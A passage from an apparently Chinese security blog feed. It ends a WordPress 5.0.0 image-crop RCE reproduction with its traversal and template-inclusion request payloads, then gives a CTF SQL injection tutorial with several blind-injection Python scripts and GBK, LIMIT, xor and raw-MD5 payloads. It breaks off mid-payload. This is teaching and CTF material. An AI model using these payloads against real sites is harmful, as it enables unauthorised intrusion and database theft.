下午9.33.05.png"><br>我们继续看一下<code>get_single_template()</code>函数，看到在 <code>get_page_template_slug()</code>取值之后赋值给了<code>$template</code>，之后<code>$template</code>经过简单的判断后赋值给<code>$templates[]</code>，最终<code>$templates</code>变量传入<code>get_query_template()</code>函数，我们继续跟进一下个函数，wp-includes/template.php:23<br><img src="https://i.loli.net/2019/03/04/5c7d2a49216ad.png" alt="屏幕快照 2019-03-04 下午9.38.00.png"><br>从这段代码中我们可以看到<code>$templates</code>变量的值又传入了<code>locate_template()</code>函数，继续跟进这个函数，wp-includes/template.php:629</p><p><img src="https://i.loli.net/2019/03/04/5c7d2ba474915.png" alt="屏幕快照 2019-03-04 下午9.43.55.png"><br>从代码中可以看到可控的变量<code>$template_name</code>值经过拼接和判断处理，因此我们结合之前的目录穿越造成的任意文件写入问题，我们需要将新生成的图片放到<code>theme-compat</code>目录下。</p><p>分析完加载的路径上的文件是我们可控之后，我们查看下载何处调用了<code>get_single_template()</code>函数，并且对其返回的变量做了何种处理。从下图中的代码，我们可以看到在74行使用<code>include</code>对<code>$template</code>变量返回的值进行了包含，从而可以造成任意代码执行。<br><img src="https://i.loli.net/2019/03/04/5c7d2d7995446.png" alt="屏幕快照 2019-03-04 下午9.51.43.png"></p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>首先上传一张图片，点击更新按钮抓包<br><img src="https://i.loli.net/2019/03/05/5c7e908b900bf.png" alt="屏幕快照 2019-03-05 下午11.05.31.png"><br>在数据包中添加如下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;meta_input[_wp_attached_file]=2019/03/2233.jpg?/../../../../themes/twentysixteen/z3r0yu.jpg</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/05/5c7e93abcd42f.png" alt="屏幕快照 2019-03-05 下午11.19.19.png"><br>可以看到数据库中已经成功保存了我们设置的值<br><img src="https://i.loli.net/2019/03/05/5c7e93ac8bfe4.png" alt="屏幕快照 2019-03-05 下午11.19.52.png"><br>接下来对图片进行剪裁，并抓包<br><img src="https://i.loli.net/2019/03/05/5c7e942d0eb99.png" alt="屏幕快照 2019-03-05 下午11.22.09.png"><br>修改数据包内容如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=crop-image&amp;_ajax_nonce=1cc3d57951&amp;id=15&amp;cropDetails[x1]=10&amp;cropDetails[y1]=10&amp;cropDetails[width]=10&amp;cropDetails[height]=10&amp;cropDetails[dst_width]=100&amp;cropDetails[dst_height]=100</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/05/5c7e94ea63e5b.png" alt="屏幕快照 2019-03-05 下午11.24.35.png"><br>最终我们可以看到图片已经在对应的路径下了<br><img src="https://i.loli.net/2019/03/05/5c7e94e8b649b.png" alt="屏幕快照 2019-03-05 下午11.24.58.png"><br>接下来进行文件包含，我们选择上传一个rce.txt，然后再次修改信息，与最初的方式一样，此处加上如下的键值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;meta_input[_wp_page_template]=cropped-z3r0yu.jpg</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/05/5c7e965ac7b1f.png" alt="屏幕快照 2019-03-05 下午11.30.36.png"><br><img src="https://i.loli.net/2019/03/05/5c7e96422d642.png" alt="屏幕快照 2019-03-05 下午11.31.00.png"><br>可以看懂数据库中已经对应的值已经修改<br><img src="https://i.loli.net/2019/03/05/5c7e96c489671.png" alt="屏幕快照 2019-03-05 下午11.33.10.png"><br>最终成功RCE<br>(PS:此处有个小坑，如果你要是访问附件出现了404，那么设置一下固定连接即可)<br><img src="https://i.loli.net/2019/03/06/5c7ea650cf4c9.png" alt="屏幕快照 2019-03-06 上午12.39.16.png"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>这个漏洞的分析和环境搭建的过程中坑点不少，先对坑点做一个小结：</p><ol><li>wordpress自动更新处理，在wp-config.php中加如一行代码<code>define(&#39;AUTOMATIC_UPDATER_DISABLED&#39;,true);</code>来禁止更新。</li><li>Imagick和GD对图片的处理方式不同的问题，对GD的利用需要Fuzz出paylaod，Imagick直接修改exif部分即可。</li><li>Windows 下的目录不能含有?，因此最好采用#。</li><li>Linux下由于xxx.jpg#是个不存在的目录，因此调用Imagick的<code>writeImage</code>函数会调用失败抛出错误终止流程，进而无法达成第二个漏洞的利用，但是看到balisong师傅借助多次上传裁剪来绕过这个坑点(目前笔者还未成功对此测试成功)。</li><li>官网的所以release版本都修复了这个漏洞。</li><li>固定连接设置问题，默认配置下查看附件会出现404。</li></ol><p>漏洞构成思路总结：首先是一个变量覆盖，将我们需要的<code>../</code>引入数据库；之后是一个剪裁图片功能未对变量内容进行审查造成目录穿越写文件；最后是模板参数处理过程中的一个本地文件包含漏洞，最终构成RCE。每个漏洞独立出来危害都极低，但是组合后却可以导致RCE的出现，此攻击链的构造十分精妙。</p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/" target="_blank" rel="noopener">《WordPress 5.0.0 Remote Code Execution》–Simon Scannell</a><br><a href="https://paper.seebug.org/822/" target="_blank" rel="noopener">《WordPress 5.0 RCE 详细分析》–LoRexxar’</a><br><a href="https://mp.weixin.qq.com/s/9DMGLOvFJUjq8MaMr9eg6A" target="_blank" rel="noopener">《Wordpress 5.0.0远程代码执行漏洞分析与复现》–balisong</a><br><a href="https://kylingit.com/blog/wordpress-image-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">《WORDPRESS IMAGE 远程代码执行漏洞分析》–诗与胡说</a><br><a href="https://www.leavesongs.com/other/tinger.html" target="_blank" rel="noopener">《Wordpress \&lt; 4.1.2 存储型XSS分析与稳定POC》–phithon</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h2&gt;&lt;p&gt;RIPS于2月20日在博客上披露了一个关于WordPress 5.0.0的远程代码执行漏洞。此漏洞由
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF中的SQLi</title>
    <link href="http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/"/>
    <id>http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/</id>
    <published>2018-11-24T10:01:30.000Z</published>
    <updated>2018-11-24T12:40:01.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-http头xff的时间盲注"><a href="#0x01-http头xff的时间盲注" class="headerlink" title="0x01 http头xff的时间盲注"></a>0x01 http头xff的时间盲注</h2><p>题目代码如下，从题目分析可以看到$ip是从xxf参数中获取的，并再使用explode函数处理后(注意在这里使用了,号作为分隔符，因而我们插入的sql语句中不能出现,号了)，直接代入sql语句，因而是存在sql注入漏洞。因为关闭了报错，因而只能采用时间盲注的方式。</p><p>因为,号不能使用，所以就意味着limit 0,1不能使用，但是可以使用from 0 for 1进行代替；if判断在此处不能使用了，但是可以使用select case when（满足条件）then（语句1）else（语句2） end语句进行代替</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure><p>数据库名的注入脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr(database() from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span>:</span><br><span class="line">            database = database + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of database is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'database:'</span>,database)</span><br></pre></td></tr></table></figure><p>注入表名的代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">table_name = <span class="string">''</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</span><br><span class="line">            table_name = table_name + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'table_name:'</span>,table_name)</span><br></pre></td></tr></table></figure><p>注入得到列名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">column_name = <span class="string">''</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag') from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</span><br><span class="line">            column_name = column_name + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'column_name:'</span>,column_name)</span><br></pre></td></tr></table></figure><p>最终注入得到列中的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">f = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select flag from flag) from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</span><br><span class="line">            flag = flag + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            f = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'flag:'</span>,flag)</span><br></pre></td></tr></table></figure><h2 id="0x02-异或注入xor"><a href="#0x02-异或注入xor" class="headerlink" title="0x02 异或注入xor/^"></a>0x02 异或注入xor/^</h2><p>xor与^的区别：前者是做逻辑运算 1 xor 0 会输出1 其他情况输出其他所有数据；后者是做位异或运算 如1^2=3 1^2=3</p><p>可以采用这种方式来判断目标站点过滤了什么关键字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/1ndex.php?id=1&apos;^(length(&apos;union&apos;)=5)%23</span><br><span class="line">当union被过滤时1^0 输出id=1</span><br><span class="line">当union没被过滤时 1 ^ 1 输出 id=0 并回显 error</span><br></pre></td></tr></table></figure><h2 id="0x03-limit注入"><a href="#0x03-limit注入" class="headerlink" title="0x03 limit注入"></a>0x03 limit注入</h2><p>在MySQL5.x版本中，后端采用如下形式进行SQL查询，此时注入点在order by语句后面无法使用union进行联合查询，因而需要另辟蹊径。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 【注入点】</span><br></pre></td></tr></table></figure></p><p>在此处我们可以使用procedure关键字调用ANALYSE存储过程来完成注入。利用姿势有以下几种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//1.报错注入</span><br><span class="line">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br><span class="line"> </span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:5.5.41-0ubuntu0.14.04.1&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT host FROM mysql.user ORDER BY 1 LIMIT 0 PROCEDURE ANALYSE (0, (SELECT 3 ORDER BY updatexml(1, concat(0x3A, version()), 1)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:5.5&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//2.时间盲注，注意此时不能使用sleep</span><br><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br><span class="line"></span><br><span class="line">//注:以上出现version()的地方都可以用想用的SQL语句替换</span><br></pre></td></tr></table></figure><h2 id="0x04-利用insert，update和delete注入获取数据"><a href="#0x04-利用insert，update和delete注入获取数据" class="headerlink" title="0x04 利用insert，update和delete注入获取数据"></a>0x04 利用insert，update和delete注入获取数据</h2><p>闭合形式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&apos; or (payload) or &apos;</span><br><span class="line">&apos; and (payload) and &apos;</span><br><span class="line">&apos; or (payload) and &apos;</span><br><span class="line">&apos; or (payload) and &apos;=&apos;</span><br><span class="line">&apos;* (payload) *&apos;</span><br><span class="line">&apos; or (payload) and &apos;</span><br><span class="line">&quot; – (payload) – &quot;</span><br></pre></td></tr></table></figure><p>利用方式:</p><ol><li>利用updatexml()获取数据</li><li>利用extractvalue()获取数据</li><li><p>利用name_const()获取数据</p><p> 注意：</p><blockquote><p>如果显示ERROR 1210 (HY000): Incorrect arguments to NAME_CONST，那就洗洗睡吧。。</p></blockquote></li></ol><blockquote><p>如果显示ERROR 1060 (42S21): Duplicate column name ‘2’，就可以进一步获取更多数据。</p><ol start="4"><li>利用子查询注入</li></ol></blockquote><p>参考:<a href="http://wooyun.jozxing.cc/static/drops/tips-2078.html" target="_blank" rel="noopener">利用insert，update和delete注入获取数据</a></p><h2 id="0x05当update注入遇到关闭显错"><a href="#0x05当update注入遇到关闭显错" class="headerlink" title="0x05当update注入遇到关闭显错"></a>0x05当update注入遇到关闭显错</h2><p>注:此处提到的或逻辑运算对insert注入也是有效的</p><p>参考:</p><p><a href="https://blog.spoock.com/2018/06/02/update-sqli-without-error/" target="_blank" rel="noopener">当update注入遇到关闭显错</a></p><p><a href="http://godot.win/index.php/archives/9/" target="_blank" rel="noopener">在Update的注入中如果关闭了显错该怎么办</a></p><h2 id="0x06-Mysql字符编码利用技巧"><a href="#0x06-Mysql字符编码利用技巧" class="headerlink" title="0x06 Mysql字符编码利用技巧"></a>0x06 Mysql字符编码利用技巧</h2><p>latin1编码不支持汉字，因而可以采用编码绕过</p><p>参考:<br><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">《Mysql字符编码利用技巧》</a></p><h2 id="0x07-GBK-Injection"><a href="#0x07-GBK-Injection" class="headerlink" title="0x07 GBK Injection"></a>0x07 GBK Injection</h2><p>单引号会被/注掉，可以用%df吃掉/封闭id</p><p>查询字段数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; order by 2%23</span><br></pre></td></tr></table></figure><p>果然两个，顺带查看其用户，库名和版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,concat_ws(char(32,58,32),user(),database(),version())%23</span><br></pre></td></tr></table></figure><p>注:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># concat_ws()第一个参数是分隔字符</span><br><span class="line"># char(32,58,32)表示的是 &quot;:&quot; 号</span><br><span class="line">MariaDB [(none)]&gt; select concat_ws(char(32,58,32),&apos;11&apos;,&apos;22&apos;,&apos;33&apos;);</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| concat_ws(char(32,58,32),&apos;11&apos;,&apos;22&apos;,&apos;33&apos;) |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| 11 : 22 : 33                             |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>库名sae-chinalover,再爆表</p><p>单引号会被/注掉，所以写sae-chinalover的16进制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 0x7361652d6368696e616c6f766572)%23</span><br></pre></td></tr></table></figure></p><p>注：<br>group_concat()是将某个字段的所有值打印在一起，方便一行输出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select group_concat(name) from aa;</span><br><span class="line">+-------------------+</span><br><span class="line">|group_concat(name) |</span><br><span class="line">+-------------------+</span><br><span class="line">|10,20,20|</span><br></pre></td></tr></table></figure><p>有四个：ctf,ctf2,ctf3,ctf4,news，爆列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 0x7361652d6368696e616c6f766572 and table_name=0x63746634)%23</span><br></pre></td></tr></table></figure><p>ctf4里有id,flag,flag应该就在这里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,(select group_concat(id,flag) from ctf4)%23</span><br></pre></td></tr></table></figure><p>可以看到构造爆错后常规注入即可。</p><h2 id="0x08-MD5加密后的SQLi"><a href="#0x08-MD5加密后的SQLi" class="headerlink" title="0x08 MD5加密后的SQLi"></a>0x08 MD5加密后的SQLi</h2><p>目标语句:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from admin where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</span><br></pre></td></tr></table></figure><blockquote><p>md5(string,raw)</p><p>string 必需。规定要计算的字符串。</p><p>raw 可选。规定十六进制或二进制输出格式：</p><p>• TRUE – 原始 16 字符二进制格式 &lt;关键点&gt;</p><p>• FALSE – 默认。32 十六进制数</p></blockquote><p>注入思路:</p><p>字符串经md5计算后的值经过hex转成字符串后为 ”or’xxx’这样的字符串</p><p>构造payload目标:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where password=&quot;or&apos;xxx&apos;</span><br></pre></td></tr></table></figure><p>可用payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">content: 129581926211651571912466741651878684928</span><br><span class="line"></span><br><span class="line">md5加密为: 06da5430449f8f6f23dfc1276f722738</span><br><span class="line"></span><br><span class="line">作hex转字符串: ?T0D??o#??’or’8.N=?</span><br><span 